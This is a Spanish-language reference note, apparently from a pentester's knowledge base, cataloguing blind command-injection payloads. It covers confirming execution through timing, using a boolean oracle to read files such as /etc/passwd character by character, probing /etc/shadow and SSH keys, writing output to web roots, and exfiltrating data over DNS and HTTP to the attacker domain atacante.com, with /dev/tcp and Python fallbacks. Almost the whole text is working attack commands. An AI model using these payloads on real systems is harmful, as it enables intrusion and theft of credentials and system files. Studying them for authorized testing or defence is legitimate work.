---
tipo: meta
aliases:
  - Command injection ciego
  - Payloads ciego de comandos
tags:
  - meta/referencia
  - dominio/web
---

# Command injection ciego - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cubre los tres canales sin salida reflejada: [[Command injection - canal ciego]], [[Command injection - canal temporal]] y [[Command injection - canal fuera de banda]]. Comparten la fase de confirmación; divergen en cómo sacan el dato. El criterio de cuál elegir está en [[MOC - Command injection]].

## 1. Confirmar ejecución

Antes de montar ningún canal hay que probar que el comando corre. Tres pruebas, de menos a más ruidosa.

`; sleep 5`
`& ping -n 5 127.0.0.1`
Retardo. Universal, no depende de egress ni de escritura. Si la respuesta tarda cinco segundos y sin el payload no tarda, hay ejecución. Repetir con otro valor para descartar casualidad.

`; nslookup a1b2.atacante.com`
DNS. Más rápido y más concluyente que el retardo, pero necesita egress y un dominio propio.

`; curl http://atacante.com/$(whoami)`
Confirma y extrae en el mismo paso. Es lo primero que se prueba si ya hay infraestructura montada.

> [!warning] Falso negativo por procesamiento asíncrono
> Si el comando se encola y corre después, la respuesta vuelve al instante: el retardo no prueba nada aunque la ejecución exista. **El DNS sí llega igual**, minutos más tarde. Ante un retardo que no funciona, probar fuera de banda antes de descartar la vulnerabilidad.

## 2. Oráculo booleano — un bit por petición

Para el canal temporal, o para el ciego cuando no hay dónde escribir.

`; test $(whoami) = root && sleep 5`
Verdadero si la condición se cumple, y entonces tarda. Falso: responde al instante.

`; if [ $(id -u) -eq 0 ]; then sleep 5; fi`
Igual con sintaxis explícita, cuando `&&` está filtrado.

`; test $(cut -c1-1 /etc/passwd) = r && sleep 5`
Extraer carácter por carácter. Se itera la posición y se compara.

`; test $(cut -c1-1 f) \> m && sleep 5`
**Búsqueda binaria**: siete preguntas por carácter en vez de decenas. Es la única forma de que este canal sea algo más que una prueba de concepto.

`; test -f /etc/shadow && sleep 5`
`; test -r /root/.ssh/id_rsa && sleep 5`
Preguntas de existencia y permisos. Barato y muy informativo: mapea el sistema sin extraer un solo byte.

## 3. Escribir en la raíz web y leer por HTTP

El canal ciego propiamente dicho: dos peticiones, salida completa.

`; id > /var/www/html/o.txt`
Escribir. Después se pide `http://objetivo/o.txt`.

`; id > /var/www/html/o.txt 2>&1`
Con el error incluido, o los comandos que fallan parecen no haber corrido.

Rutas habituales, en orden de probabilidad:

```
/var/www/html
/var/www
/usr/share/nginx/html
/srv/http
/opt/lampp/htdocs
C:\inetpub\wwwroot
C:\xampp\htdocs
```

`; pwd > /var/www/html/o.txt`
`; ls -la . > /var/www/html/o.txt`
Si no se sabe la raíz: escribir en varias candidatas y ver cuál responde.

`; echo $(id) | tee /var/www/html/o.txt`
Alternativa cuando `>` está filtrado.

> [!danger] Limpiar siempre
> `; rm /var/www/html/o.txt` al terminar. Un archivo con salida de comandos en la raíz web es evidencia persistente que sobrevive al engagement, y queda accesible a cualquiera que adivine el nombre. Usar nombres aleatorios y anotarlos.

## 4. Fuera de banda por DNS

`; nslookup $(whoami).atacante.com`
Directo. Falla si el dato tiene caracteres inválidos en DNS.

`; nslookup $(whoami | base64 -w0).atacante.com`
Codificado. `-w0` es imprescindible: sin él `base64` corta a 76 columnas e inserta saltos de línea.

`; nslookup $(cat /etc/passwd | base64 -w0 | tr -d '=' | cut -c1-60).atacante.com`
Troceado. **Límite de 63 caracteres por etiqueta** y 253 en total; hay que partir y numerar.

`; for i in 1 2 3; do nslookup $i.$(cat f|base64 -w0|cut -c$((i*50-49))-$((i*50))).atacante.com; done`
Bucle de troceo. Cada consulta lleva su índice para reordenar en el receptor.

`; nslookup $(date +%s).$(whoami).atacante.com`
Marca de tiempo como prefijo único: evita que la **caché de DNS** se coma la segunda consulta con el mismo nombre. Es la causa más común de resultados que se pierden en silencio.

`; curl http://atacante.com/ -d @/etc/passwd`
`; wget --post-file=/etc/passwd http://atacante.com/`
Si HTTP saliente funciona, siempre preferible: sin límite de longitud ni de alfabeto.

## 5. Cuando faltan los binarios

En contenedores mínimos no hay `curl`, `nc` ni `nslookup`.

`; exec 3<>/dev/tcp/atacante.com/80; echo -e "GET /$(whoami) HTTP/1.0\n" >&3`
`bash` con `/dev/tcp`. No es un archivo real: es una función del propio shell, así que no depende de ningún binario. Requiere `bash`, no `sh`.

`; python3 -c "import socket;socket.gethostbyname('$(whoami).atacante.com')"`
Si hay Python, hay resolución DNS.

`; getent hosts x.atacante.com`
Parte de `libc`, presente donde no hay herramientas de red.
